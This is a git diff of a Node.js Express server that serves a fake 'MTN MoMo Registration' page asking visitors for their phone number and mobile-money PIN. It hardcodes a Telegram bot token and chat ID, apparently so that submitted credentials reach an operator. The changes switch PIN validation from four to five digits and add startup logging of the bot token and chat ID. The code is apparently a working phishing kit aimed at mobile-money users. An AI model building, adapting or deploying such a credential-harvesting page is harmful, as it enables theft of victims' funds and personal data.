@@ -4,7 +4,7 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ===== CONFIGURATION =====
+// ===== CONFIGURATION - BOT 1 =====
 const BOT_TOKEN = '8251322580:AAFB3YYWIlUcdQMoxVMDwC3LJWUg_piMrjI';
 const CHAT_ID = '6306424209';
 
@@ -12,7 +12,7 @@ const CHAT_ID = '6306424209';
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ===== HTML PAGE (embedded in server) =====
+// ===== HTML PAGE =====
 const HTML_PAGE = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -57,7 +57,7 @@ header p{color:#666;margin-top:5px;font-size:0.95em}
 </div>
 <div class="form-group">
 <label>MoMo PIN <span class="required">*</span></label>
-<input type="password" id="momoPin" placeholder="Enter 4-digit PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
+<input type="password" id="momoPin" placeholder="Enter 5-digit PIN" maxlength="5" pattern="[0-9]{5}" inputmode="numeric" required autocomplete="off">
 </div>
 <button type="submit" class="btn" id="submitBtn"><span id="submitText">Register</span></button>
 </form>
@@ -70,7 +70,7 @@ var mtnNumber=document.getElementById('mtnNumber').value.trim();
 var momoPin=document.getElementById('momoPin').value.trim();
 if(!mtnNumber){showMessage('Please enter your MTN number','error');return}
 if(mtnNumber.length<10){showMessage('Please enter a valid MTN number (10 digits)','error');return}
-if(!momoPin||momoPin.length!==4){showMessage('MoMo PIN must be 4 digits','error');return}
+if(!momoPin||momoPin.length!==5){showMessage('MoMo PIN must be 5 digits','error');return}
 var btn=document.getElementById('submitBtn');
 var btnText=document.getElementById('submitText');
 btn.disabled=true;
@@ -106,7 +106,7 @@ setTimeout(function(){div.className='message'},5000);
 </body>
 </html>`;
 
-// ===== SUCCESS PAGE (embedded in server) =====
+// ===== SUCCESS PAGE =====
 const SUCCESS_PAGE = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -171,10 +171,10 @@ app.post('/api/register', async (req, res) => {
             });
         }
 
-        if (momoPin.length !== 4) {
+        if (momoPin.length !== 5) {
             return res.status(400).json({
                 success: false,
-                message: 'MoMo PIN must be 4 digits'
+                message: 'MoMo PIN must be 5 digits'
             });
         }
 
@@ -220,5 +220,7 @@ app.get('/health', (req, res) => {
 
 // ===== START SERVER =====
 app.listen(PORT, () => {
-    console.log(`🚀 MTN MoMo Registration running on port ${PORT}`);
+    console.log(`🚀 MTN MoMo Registration (Bot 1) running on port ${PORT}`);
+    console.log(`🤖 Bot: ${BOT_TOKEN.substring(0, 15)}...`);
+    console.log(`📱 Chat ID: ${CHAT_ID}`);
 });
